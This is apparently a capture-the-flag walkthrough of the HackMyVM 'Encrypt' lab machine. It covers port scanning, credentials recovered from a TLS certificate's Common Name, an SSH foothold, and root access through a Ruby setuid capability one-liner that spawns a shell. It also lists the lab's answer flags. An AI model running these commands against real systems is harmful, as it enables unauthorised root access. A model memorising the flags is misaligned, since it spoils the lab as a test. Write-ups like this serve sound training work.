+++
title = "Encrypt - Walkthrough"
date = "2026-08-29"
author = "nvru"
description = "Walkthrough for the Encrypt machine."
tags = [
  "ctf",
  "walkthrough",
  "linux"
]
draft = false
+++

## Overview

- **Platform:** HackMyVM
- **Difficulty:** `Easy`
- **OS:** `Linux`
- **Attacker IP:** `10.10.10.2`
- **Target IP:** `10.10.10.5`

The objective was to enumerate the exposed services, identify a valid set of credentials, gain a foothold on the target through SSH, and exploit a misconfigured Linux capability to escalate privileges and obtain a root shell.

---

## Enumeration

### Host Discovery

```bash
netdiscover -i vboxnet0 -r 10.10.10.0/24
```

### Port Scanning

#### RustScan (TCP)

```bash
rustscan -a 10.10.10.5 -- -sC -sV -A -oN nmap/rust
```

#### Results

```text
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 10.0p2 Debian 7+deb13u2
443/tcp open  ssl/http Apache httpd 2.4.67 (Debian)
```

The scan identified two open services:

| Port | Service | Version        |
| ---- | ------- | -------------- |
| 22   | SSH     | OpenSSH 10.0p2 |
| 443  | HTTPS   | Apache 2.4.67  |

While reviewing the SSL certificate, an interesting value appeared in the Common Name field:

```text
commonName=iot:Goat123!
```

This looked like it could be a username and password rather than a typical certificate name.

---

## Initial Access

The recovered credentials could have been intended for either the web application or SSH.

- [ ] Test HTTP
- [x] Test SSH

Using them against SSH successfully authenticated as the `iot` user.

```bash
ssh iot@10.10.10.5
```

![SSH Login](/images/hmv/encrypt/ssh_login.png)

---

## Privilege Escalation

### iot → root

The first step was checking for common privilege escalation vectors.

The current user had no `sudo` permissions.

![sudo](/images/hmv/encrypt/sudo.png)

`doas` was also unavailable.

![doas](/images/hmv/encrypt/doas.png)

I continued with manual enumeration.

The user's home directory contained no useful artifacts. Files such as `.bash_history` were empty.

![home](/images/hmv/encrypt/home.png)

![local](/images/hmv/encrypt/local.png)

Enumerating interactive users showed that only `iot` and `root` existed on the system.

```bash
cat /etc/passwd | grep sh$
```

![users](/images/hmv/encrypt/users.png)

The web root also contained nothing interesting besides the default Apache page.

![webroot](/images/hmv/encrypt/webroot.png)

Inspecting `index.html` confirmed it was simply the default Debian Apache landing page.

![apache](/images/hmv/encrypt/apache_default.png)

### Ruby Capabilities

Since common enumeration did not reveal a privilege escalation path, I checked Linux file capabilities.

```bash
/sbin/getcap -r / 2>/dev/null
```

Among the results, the Ruby interpreter had the capability required to change its effective UID.

![Capabilities](/images/hmv/encrypt/.png)

This allows Ruby to elevate directly to UID 0.

```bash
ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'
```

Executing the command spawned a root shell.

![Root Shell](/images/hmv/encrypt/root_shell.png)

---

## Credentials

```text
iot:Goat123!
```

---

## Flags

### User

```text
8a86e2c71318c41c30c442a0605af4e638de10f2476a70d0d054c19070db1a9d
```

### Root

```text
bc06e6ee33aee532901fc6cd2926ea0789751a6bfd47f7dea5654cdf68418b85
```

---

## Attack Path

```text
RustScan Enumeration
        ↓
SSL Certificate Inspection
        ↓
Recovered Credentials (iot:Goat123!)
        ↓
SSH Access as iot
        ↓
Local Enumeration
        ↓
Enumerate Linux Capabilities
        ↓
Ruby setuid Capability Abuse
        ↓
Root Shell
```

---

## References

- [GTFOBins – Ruby](https://gtfobins.github.io/gtfobins/ruby/)
- [HackTricks – Linux Privilege Escalation Checklist](https://hacktricks.wiki/en/linux-hardening/interesting-files-permissions/linux-capabilities.html)
